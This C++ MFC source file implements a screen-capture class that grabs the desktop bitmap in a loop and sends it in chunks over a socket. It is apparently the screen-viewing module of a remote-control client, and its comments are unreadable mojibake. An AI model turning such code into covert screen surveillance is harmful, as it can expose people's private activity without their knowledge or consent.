#include "StdAfx.h"
#include "Screen.h"

CScreen::CScreen(void)
{
	m_pData = NULL;
	m_bFlag = true;
}

CScreen::~CScreen(void)
{
}

void CScreen::GetScreen()
{
	CDC* pDeskDC = CWnd::GetDesktopWindow()->GetDC();  //��ȡ���滭������
	CRect rect;
	CWnd::GetDesktopWindow()->GetClientRect(rect);  //��ȡ��Ļ�Ŀͻ�����
	int nWidth  = GetSystemMetrics(SM_CXSCREEN);  //��ȡ��Ļ�Ŀ��
	int nHeight = GetSystemMetrics(SM_CYSCREEN);  //��ȡ��Ļ�ĸ߶�
	CDC memDC;  //�ڴ��DC����
	memDC.CreateCompatibleDC(pDeskDC);  //����һ�����ݵĻ���
	CBitmap bmp;
	bmp.CreateCompatibleBitmap(pDeskDC, nWidth, nHeight); //��������λͼ
	memDC.SelectObject(&bmp); //ѡ��λͼ����
	BITMAP bitMap;
	bmp.GetBitmap(&bitMap);
	m_panelsize = 0;  //��¼��ɫ��Ĵ�С
	//��Ҫ������ɫ�ж��㷨
	if (bitMap.bmBitsPixel < 16)  //�ж��Ƿ������ɫλͼ
	{
		m_panelsize = pow(2.0, (double)bitMap.bmBitsPixel * sizeof(RGBQUAD));
	}
	m_nHeadTotal = (int)m_panelsize + sizeof(BITMAPINFO);
	m_pBMPINFO = (BITMAPINFO*)LocalAlloc(LPTR,sizeof(BITMAPINFO)+(int)m_panelsize);
	m_pBMPINFO->bmiHeader.biBitCount      = bitMap.bmBitsPixel;//4
	m_pBMPINFO->bmiHeader.biClrImportant  = 0;
	m_pBMPINFO->bmiHeader.biCompression   = 0;
	m_pBMPINFO->bmiHeader.biHeight        = nHeight;
	m_pBMPINFO->bmiHeader.biPlanes        = bitMap.bmPlanes;
	m_pBMPINFO->bmiHeader.biSize          = sizeof(BITMAPINFO);
	m_pBMPINFO->bmiHeader.biSizeImage     = bitMap.bmWidthBytes * bitMap.bmHeight;
	m_pBMPINFO->bmiHeader.biWidth         = nWidth;
	m_pBMPINFO->bmiHeader.biXPelsPerMeter = 0;
	m_pBMPINFO->bmiHeader.biYPelsPerMeter = 0;

	memDC.BitBlt(0, 0, nWidth, nHeight, pDeskDC, 0, 0, SRCCOPY);
	m_totalSize = bitMap.bmWidthBytes * bitMap.bmHeight;
	m_pData = new BYTE[m_totalSize];
	if(0 == ::GetDIBits(memDC.m_hDC,bmp,0,bitMap.bmHeight,m_pData,m_pBMPINFO, DIB_RGB_COLORS))
	{
		printf("Return 0\n");
		//delete pData;
		m_pData = NULL;
		return;
	}
}

void CScreen::SendScreenData()  //ѭ��������Ļ����
{
	while (m_bFlag)
	{
		GetScreen(); //��ȡ��Ļ����
		SendBmpHeaderInfo();  //����λͼͷ����
		SendBmpData();  //����λͼ����
		Sleep(300);
		CleanData();
	}
}

void CScreen::SendBmpHeaderInfo()
{
	BMPDATA_S bmpdata;
	memset(&bmpdata,0,sizeof(BMPDATA_S));
	bmpdata.Id = 0;
	bmpdata.bShow = false;
	bmpdata.Size = m_totalSize;
	bmpdata.HeadSize = m_nHeadTotal;
	memcpy(&bmpdata.bmpinfo, m_pBMPINFO, m_nHeadTotal);

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_SCREEN;
	memcpy((char*)tagMsgInfo.context, (char*)&bmpdata, sizeof(BMPDATA_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CScreen::SendBmpData()
{
	MSGINFO_S tagMsgInfo;

	BMPDATA_S tagBmpData;
	memset(&tagBmpData, 0, sizeof(BMPDATA_S));
	const int nBufSize = SCREEN_BUF_SIZE;   //һ�η������ݵĴ�С

	tagBmpData.Id = 1;
	int nCount = m_totalSize / nBufSize + 1;  //���͵Ĵ���
	if (0 == m_totalSize % nBufSize)
	{
		nCount = nCount - 1;
	}

	tagBmpData.bShow = false;  //��ʾͼ��
	UINT nBegin = 0, nEnd = nBufSize;
	for (int index = 0; index < nCount ; index++)  //ѭ������
	{
		memset(&tagBmpData.Data, 0, nBufSize); //��ʼ������
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_SCREEN;

		nBegin = index * nBufSize;  //ÿ�ο�ʼ�������ݵ�λ��
		tagBmpData.Begin = nBegin;
		tagBmpData.Size  = 0;
		tagBmpData.HeadSize = 0;  //λͼͷ��СĬ��ֵΪ0

		if (index == nCount -1)  //���һ�η���
		{
			tagBmpData.bShow = true;  //��ʱ������ʾͼ����
			tagBmpData.Id = 2;
			tagBmpData.Size = m_totalSize;  //���ݵ��ܴ�С
			for (UINT i = nBegin, k = 0; i < m_totalSize; i++, k++)
			{
				tagBmpData.Data[k] = m_pData[i];
			}
		}
		else
		{
			for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
			{
				tagBmpData.Data[k] = m_pData[i];
			}
		}
		memcpy((char*)tagMsgInfo.context, (char*)&tagBmpData, sizeof(BMPDATA_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
}

//�������
void CScreen::CleanData()
{
	if (NULL != m_pData)
	{
		delete[] m_pData;
		m_pData = NULL;
	}
	if (NULL != m_pBMPINFO)
	{
		LocalFree(m_pBMPINFO);
		m_pBMPINFO = NULL;
	}
}